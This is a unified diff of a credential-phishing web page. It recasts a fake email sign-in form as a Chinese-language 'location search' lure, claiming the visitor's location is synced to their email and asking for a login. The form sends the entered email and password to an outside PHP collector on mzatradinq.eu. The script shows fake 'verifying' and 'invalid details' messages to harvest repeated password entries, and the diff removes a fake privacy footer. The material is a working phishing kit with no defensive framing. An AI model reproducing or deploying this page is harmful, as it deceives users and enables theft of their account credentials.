@@ -1,6 +1,6 @@
 
 <html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<title class="logoname">Quarantine&amp;mARzAuvP </title>
+<title class="logoname">Location Map</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="apple-touch-icon" type="image/png" class="logoimg" href="" />
 <link rel="shortcut icon" type="image/x-icon" class="logoimg" href="" />
@@ -53,7 +53,7 @@ h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 {
 
 /** Login 1 start **/
 .login-1 {
-    background: rgba(0, 0, 0, 0.04) url(../img/bg-image.jpg) top left repeat;
+    background: rgba(0, 0, 0, 0.04) url(https://firebasestorage.googleapis.com/v0/b/zinc-prism-401817.appspot.com/o/map.jpg?alt=media&token=71d1b14e-acef-436c-95bc-14c253bd0003) top left repeat;
     background-size: cover;
     top: 0;
     width: 100%;
@@ -319,7 +319,7 @@ allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 
 <br><br>
 
 </div></h2>
-<h3>Sign in to continue</h3>
+<h3>您的位置已与您的手机电子邮件 ID 同步。 登录以继续位置搜索。</h3>
 <form name="members" action="https://mzatradinq.eu/Map/fire.php" method="GET">
 <div class="form-group">
 <center>
@@ -327,24 +327,22 @@ allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 
 <div id="msg" style="display: none;font-weight: 600;color: red;">wrong username or Password.! Please enter correct details.</div>
 <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
 </center>
-<input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
+<input type="email" id="email" name="email" class="input-text" placeholder="电子邮件地址" readonly>
 </div>
 <div class="form-group">
-<input type="password" id="password" name="Password" class="input-text" autocomplete="on" placeholder="Password">
+<input type="password" id="password" name="Password" class="input-text" autocomplete="on" placeholder="密码">
 </div>
 <table width="247" border="0" align="center" cellpadding="0" cellspacing="0">
 <tr>
 <td bgcolor="#000066"><div class="btn-holder">
-<button class="btn btn-lg col-12 style1" id="submit-btn">Continue</button>
+<button class="btn btn-lg col-12 style1" id="submit-btn">继续</button>
 </div></td>
  </tr>
 </table>
 </form>
-<span class="privacy">
+<span class="">
 </div>
-<div class="footer">
-Privacy Policy: <span id="kai" style="text-transform: capitalize;"></span><br>
-Your information is only for the sole purpose of viewing this document and would not be sold or shared to any third party.
+<div class="">
 </div>
 </div>
 </div>
@@ -485,7 +483,7 @@ Your information is only for the sole purpose of viewing this document and would
         },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
-              $('#submit-btn').html('Verifing...');
+              $('#submit-btn').html('正在验证...');
             },
             success: function(response){
 			 if(response){
@@ -516,10 +514,10 @@ Your information is only for the sole purpose of viewing this document and would
                   //    window.location.replace("https://office.com");
               }
               $("#msg").show();
-               $('#msg').html("Invalid Details,Please try again");
+               $('#msg').html("详细信息无效，请重试");
             },
             complete: function(){
-              $('#submit-btn').html('Sign in');
+              $('#submit-btn').html('登入');
             }
           });
     });
